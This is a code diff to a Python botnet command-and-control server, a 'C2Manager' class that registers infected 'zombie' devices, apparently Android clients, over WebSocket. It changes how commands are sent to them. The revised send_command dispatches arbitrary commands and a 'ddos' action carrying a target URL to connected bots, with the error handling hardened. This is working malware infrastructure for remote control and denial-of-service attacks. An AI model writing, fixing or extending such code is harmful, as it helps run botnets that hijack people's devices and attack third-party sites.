@@ -25,12 +25,12 @@ class C2Manager:
                 if zombie:
                     zombie.status = "online"
                     await session.commit()
-                await websocket.send_json({
-                    "success": True,
-                    "zombie_id": zombie_id,
-                    "text": "Welcome to Zombie!"
-                })
-                print(f"[+] Zombie {zombie_id} is now online.")
+            await websocket.send_json({
+                "success": True,
+                "zombie_id": zombie_id,
+                "text": "Welcome to Zombie!"
+            })
+            print(f"[+] Zombie {zombie_id} is now online.")
         except Exception as e:
             print(e)
 
@@ -51,30 +51,37 @@ class C2Manager:
             print(f"[!] DB Error during disconnect for {zombie_id}: {e}")
 
     async def send_command(self, zombie_id: str, command: dict) -> bool:
+        # 1. Safely retrieve the WebSocket connection
         ws = self.zombies.get(zombie_id)
-        if ws:
-            try:
-                action = command['action']
-                if action != 'ddos':
-                    await ws.send_json({
-                        "action": command.get('action'),
-                        "cmd": command.get("command_type"),
-                        "command_id": command.get("command_id")
-                    })
-                    return True
-                await ws.send_json({
+        
+        if not ws:
+            print(f"[!] Send failed: Zombie {zombie_id} is not connected (offline).")
+            return False
+
+        try:
+            # 2. Use .get() with a default to avoid KeyError
+            action = command.get('action')
+            
+            if action != 'ddos':
+                # Note: Ensure Android client expects "cmd" and "command_id"
+                payload = {
                     "action": action,
+                    "cmd": command.get("command_type"),
+                    "command_id": str(command.get("command_id"))
+                }
+            else:
+                payload = {
+                    "action": "ddos",
                     "url": command.get("url"),
-                })
-                print({
-                    "action": action,
-                    "url": command.get("url"),
-                })
-                return True
-            except Exception as e:
-                print(f"[!] DB Error during send command for {zombie_id}: {e}")
-                return False
-        return False
+                }
+
+            await ws.send_json(payload)
+            return True
+
+        except Exception as e:
+            # 3. Log the actual communication error
+            print(f"[!] WebSocket Error sending to {zombie_id}: {e}")
+            return False
 
     async def get_terminal_queue(self, zombie_id: str):
         if zombie_id not in self.terminal_queues:
